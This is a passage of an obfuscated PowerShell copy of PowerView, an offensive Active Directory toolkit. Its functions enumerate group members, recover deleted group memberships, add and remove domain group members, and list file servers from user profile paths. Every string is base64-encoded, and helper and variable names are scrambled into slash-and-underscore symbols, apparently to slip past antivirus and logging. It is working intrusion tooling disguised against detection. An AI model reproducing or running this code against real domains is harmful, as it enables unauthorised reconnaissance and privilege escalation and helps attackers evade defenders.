                        if (${/=\/=\/\/=\/=====} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBpAGcAbgBTAGUAYwB1AHIAaQB0AHkAUAByAGkAbgBjAGkAcABhAGwAcwB8AFMALQAxAC0ANQAtADIAMQA=')))) {
                            try {
                                if (-not ${_/\___/\__/=\/==\}) {
                                    ${_/\___/\__/=\/==\} = $Properties.cn[0]
                                }
                                ${_/=\/\_/=\/=\/\__} = __/\/=\_/\/=\/=\_/ -Identity ${_/\___/\__/=\/==\} -_/============\/\/ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AUwBpAG0AcABsAGUA'))) @___/=\/=\__/====\
                                if (${_/=\/\_/=\/=\/\__}) {
                                    ${___/=\_/==\/===\/} = ${_/=\/\_/=\/=\/\__}.Split('@')[1]
                                }
                                else {
                                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQByAHIAbwByACAAYwBvAG4AdgBlAHIAdABpAG4AZwAgACQAewAvAD0AXAAvAD0AXAAvAFwALwA9AFwALwA9AD0APQA9AD0AfQA=')))
                                    ${___/=\_/==\/===\/} = $Null
                                }
                            }
                            catch {
                                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQByAHIAbwByACAAYwBvAG4AdgBlAHIAdABpAG4AZwAgACQAewAvAD0AXAAvAD0AXAAvAFwALwA9AFwALwA9AD0APQA9AD0AfQA=')))
                                ${___/=\_/==\/===\/} = $Null
                            }
                        }
                        else {
                            ${___/=\_/==\/===\/} = ${/=\/=\/\/=\/=====}.SubString(${/=\/=\/\/=\/=====}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        }
                    }
                    catch {
                        ${/=\/=\/\/=\/=====} = $Null
                        ${___/=\_/==\/===\/} = $Null
                    }
                    if ($Properties.samaccountname) {
                        ${/=\_/=\/=====\_/=} = $Properties.samaccountname[0]
                    }
                    else {
                        try {
                            ${/=\_/=\/=====\_/=} = __/\/=\/=\_/\/=\/= -/===\_/\_/\_/=\__ $Properties.cn[0] @___/=\/=\__/====\
                        }
                        catch {
                            ${/=\_/=\/=====\_/=} = $Properties.cn[0]
                        }
                    }
                    if ($Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG0AcAB1AHQAZQByAA==')))) {
                        ${/=====\/\/===\/\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG0AcAB1AHQAZQByAA==')))
                    }
                    elseif ($Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA==')))) {
                        ${/=====\/\/===\/\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA==')))
                    }
                    elseif ($Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA=')))) {
                        ${/=====\/\/===\/\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA=')))
                    }
                    else {
                        ${/=====\/\/===\/\/} = $Null
                    }
                    ${_____/==\/\_/\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) ${___/=\_/==\/===\/}
                    ${_____/==\/\_/\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) ${/=\_/=\/=====\_/=}
                    ${_____/==\/\_/\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlAA=='))) ${/=\/=\/\/=\/=====}
                    ${_____/==\/\_/\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATwBiAGoAZQBjAHQAQwBsAGEAcwBzAA=='))) ${/=====\/\/===\/\/}
                    ${_____/==\/\_/\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIAUwBJAEQA'))) ${_/\___/\__/=\/==\}
                    ${_____/==\/\_/\_/\}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAATQBlAG0AYgBlAHIA'))))
                    ${_____/==\/\_/\_/\}
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAdQByAHMAZQA=')))] -and ${/=\/=\/\/=\/=====} -and (${/=====\/\/===\/\/} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA=='))))) {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAATQBhAG4AdQBhAGwAbAB5ACAAcgBlAGMAdQByAHMAaQBuAGcAIABvAG4AIABnAHIAbwB1AHAAOgAgACQAewAvAD0AXAAvAD0AXAAvAFwALwA9AFwALwA9AD0APQA9AD0AfQA=')))
                        ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${/=\/=\/\/=\/=====}
                        $Null = ${_/\/\/\/\___/\/\/}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA='))))
                        __/\_____/===\/\/\ @_/\/\/\/\___/\/\/
                    }
                }
            }
            ${_/\_____/=\_/===\}.dispose()
        }
    }
}
function Get-DomainGroupMemberDeleted {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.DomainGroupMemberDeleted')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${_/\/\/\/\___/\/\/} = @{
            'Properties'    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAdgBhAGwAdQBlAG0AZQB0AGEAZABhAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            'Raw'           =   $True
            'LDAPFilter'    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBnAHIAbwB1AHAAKQA=')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        _____/\/==\/\_/=== @_/\/\/\/\___/\/\/ | % {
            ${_/\_/=\____/===\/} = $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))][0]
            ForEach(${___/=\_/\/\__/\_/} in $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAdgBhAGwAdQBlAG0AZQB0AGEAZABhAHQAYQA=')))]) {
                ${_/\/==\/=\___/\/=} = [xml]${___/=\_/\/\__/\_/} | select -ExpandProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABTAF8AUgBFAFAATABfAFYAQQBMAFUARQBfAE0ARQBUAEEAXwBEAEEAVABBAA=='))) -ErrorAction SilentlyContinue
                if (${_/\/==\/=\___/\/=}) {
                    if ((${_/\/==\/=\___/\/=}.pszAttributeName -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIA')))) -and ((${_/\/==\/=\___/\/=}.dwVersion % 2) -eq 0 )) {
                        ${/===\______/\/==\} = New-Object PSObject
                        ${/===\______/\/==\} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQATgA='))) ${_/\_/=\____/===\/}
                        ${/===\______/\/==\} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABOAA=='))) ${_/\/==\/=\___/\/=}.pszObjectDn
                        ${/===\______/\/==\} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBGAGkAcgBzAHQAQQBkAGQAZQBkAA=='))) ${_/\/==\/=\___/\/=}.ftimeCreated
                        ${/===\______/\/==\} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGUAbABlAHQAZQBkAA=='))) ${_/\/==\/=\___/\/=}.ftimeDeleted
                        ${/===\______/\/==\} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcAQwBoAGEAbgBnAGUA'))) ${_/\/==\/=\___/\/=}.ftimeLastOriginatingChange
                        ${/===\______/\/==\} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBzAEEAZABkAGUAZAA='))) (${_/\/==\/=\___/\/=}.dwVersion / 2)
                        ${/===\______/\/==\} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcARABzAGEARABOAA=='))) ${_/\/==\/=\___/\/=}.pszLastOriginatingDsaDN
                        ${/===\______/\/==\}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAG8AbQBhAGkAbgBHAHIAbwB1AHAATQBlAG0AYgBlAHIARABlAGwAZQB0AGUAZAA='))))
                        ${/===\______/\/==\}
                    }
                }
                else {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBEAGUAbABlAHQAZQBkAF0AIABFAHIAcgBvAHIAIAByAGUAdAByAGkAZQB2AGkAbgBnACAAJwBtAHMAZABzAC0AcgBlAHAAbAB2AGEAbAB1AGUAbQBlAHQAYQBkAGEAdABhACcAIABmAG8AcgAgACcAJAB7AF8ALwBcAF8ALwA9AFwAXwBfAF8AXwAvAD0APQA9AFwALwB9ACcA')))
                }
            }
        }
    }
}
function Add-DomainGroupMember {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        ${_____/\/===\/=\_/},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${_/=====\/\/==\/\/} = @{
            'Identity' = $Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/=====\/\/==\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/=====\/\/==\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${___/\/==\/\/\/\/=} = __/=\/=\_/\/=\_/\_ @_/=====\/\/==\/\/
        if (${___/\/==\/\/\/\/=}) {
            try {
                ${_/==\/=\/=\/\/\/\} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity(${___/\/==\/\/\/\/=}.Context, ${___/\/==\/\/\/\/=}.Identity)
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBBAGQAZAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQByAHIAbwByACAAZgBpAG4AZABpAG4AZwAgAHQAaABlACAAZwByAG8AdQBwACAAaQBkAGUAbgB0AGkAdAB5ACAAJwAkAEkAZABlAG4AdABpAHQAeQAnACAAOgAgACQAXwA=')))
            }
        }
    }
    PROCESS {
        if (${_/==\/=\/=\/\/\/\}) {
            ForEach (${_/==\__/=\____/\/} in ${_____/\/===\/=\_/}) {
                if (${_/==\__/=\____/\/} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgArAFwAXAAuACsA')))) {
                    ${_/=====\/\/==\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${_/==\__/=\____/\/}
                    ${___/\_/=====\/\/=} = __/=\/=\_/\/=\_/\_ @_/=====\/\/==\/\/
                    if (${___/\_/=====\/\/=}) {
                        $UserIdentity = ${___/\_/=====\/\/=}.Identity
                    }
                }
                else {
                    ${___/\_/=====\/\/=} = ${___/\/==\/\/\/\/=}
                    $UserIdentity = ${_/==\__/=\____/\/}
                }
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBBAGQAZAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAQQBkAGQAaQBuAGcAIABtAGUAbQBiAGUAcgAgACcAJAB7AF8ALwA9AD0AXABfAF8ALwA9AFwAXwBfAF8AXwAvAFwALwB9ACcAIAB0AG8AIABnAHIAbwB1AHAAIAAnACQASQBkAGUAbgB0AGkAdAB5ACcA')))
                ${_/==\__/=\____/\/} = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity(${___/\_/=====\/\/=}.Context, $UserIdentity)
                ${_/==\/=\/=\/\/\/\}.Members.Add(${_/==\__/=\____/\/})
                ${_/==\/=\/=\/\/\/\}.Save()
            }
        }
    }
}
function Remove-DomainGroupMember {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        ${_____/\/===\/=\_/},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${_/=====\/\/==\/\/} = @{
            'Identity' = $Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/=====\/\/==\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/=====\/\/==\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${___/\/==\/\/\/\/=} = __/=\/=\_/\/=\_/\_ @_/=====\/\/==\/\/
        if (${___/\/==\/\/\/\/=}) {
            try {
                ${_/==\/=\/=\/\/\/\} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity(${___/\/==\/\/\/\/=}.Context, ${___/\/==\/\/\/\/=}.Identity)
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBSAGUAbQBvAHYAZQAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQByAHIAbwByACAAZgBpAG4AZABpAG4AZwAgAHQAaABlACAAZwByAG8AdQBwACAAaQBkAGUAbgB0AGkAdAB5ACAAJwAkAEkAZABlAG4AdABpAHQAeQAnACAAOgAgACQAXwA=')))
            }
        }
    }
    PROCESS {
        if (${_/==\/=\/=\/\/\/\}) {
            ForEach (${_/==\__/=\____/\/} in ${_____/\/===\/=\_/}) {
                if (${_/==\__/=\____/\/} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgArAFwAXAAuACsA')))) {
                    ${_/=====\/\/==\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${_/==\__/=\____/\/}
                    ${___/\_/=====\/\/=} = __/=\/=\_/\/=\_/\_ @_/=====\/\/==\/\/
                    if (${___/\_/=====\/\/=}) {
                        $UserIdentity = ${___/\_/=====\/\/=}.Identity
                    }
                }
                else {
                    ${___/\_/=====\/\/=} = ${___/\/==\/\/\/\/=}
                    $UserIdentity = ${_/==\__/=\____/\/}
                }
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBSAGUAbQBvAHYAZQAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAUgBlAG0AbwB2AGkAbgBnACAAbQBlAG0AYgBlAHIAIAAnACQAewBfAC8APQA9AFwAXwBfAC8APQBcAF8AXwBfAF8ALwBcAC8AfQAnACAAZgByAG8AbQAgAGcAcgBvAHUAcAAgACcAJABJAGQAZQBuAHQAaQB0AHkAJwA=')))
                ${_/==\__/=\____/\/} = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity(${___/\_/=====\/\/=}.Context, $UserIdentity)
                ${_/==\/=\/=\/\/\/\}.Members.Remove(${_/==\__/=\____/\/})
                ${_/==\/=\/=\/\/\/\}.Save()
            }
        }
    }
}
function _/==\/===\__/\/=\_ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        function _/\____/=\_/==\___ {
            Param([String]$Path)
            if ($Path -and ($Path.split('\\').Count -ge 3)) {
                ${/===\__/\/\/\/=\_} = $Path.split('\\')[2]
                if (${/===\__/\/\/\/=\_} -and (${/===\__/\/\/\/=\_} -ne '')) {
                    ${/===\__/\/\/\/=\_}
                }
            }
        }
        ${_/\/\/\/\___/\/\/} = @{
            'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMwA2ADgAKQAoACEAKAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADIAKQApACgAfAAoAGgAbwBtAGUAZABpAHIAZQBjAHQAbwByAHkAPQAqACkAKABzAGMAcgBpAHAAdABwAGEAdABoAD0AKgApACgAcAByAG8AZgBpAGwAZQBwAGEAdABoAD0AKgApACkAKQA=')))
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQAsAHMAYwByAGkAcAB0AHAAYQB0AGgALABwAHIAbwBmAGkAbABlAHAAYQB0AGgA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ForEach ($TargetDomain in $Domain) {
                ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $TargetDomain
                ${/===\/\/\_____/\/} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
                $(ForEach(${/=\/==\/==\__/\/=} in ${/===\/\/\_____/\/}.FindAll()) {if (${/=\/==\/==\__/\/=}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQA=')))]) {_/\____/=\_/==\___(${/=\/==\/==\__/\/=}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQA=')))])}if (${/=\/==\/==\__/\/=}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAHIAaQBwAHQAcABhAHQAaAA=')))]) {_/\____/=\_/==\___(${/=\/==\/==\__/\/=}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAHIAaQBwAHQAcABhAHQAaAA=')))])}if (${/=\/==\/==\__/\/=}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAG8AZgBpAGwAZQBwAGEAdABoAA==')))]) {_/\____/=\_/==\___(${/=\/==\/==\__/\/=}.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAG8AZgBpAGwAZQBwAGEAdABoAA==')))])}}) | sort -Unique
            }
        }
        else {
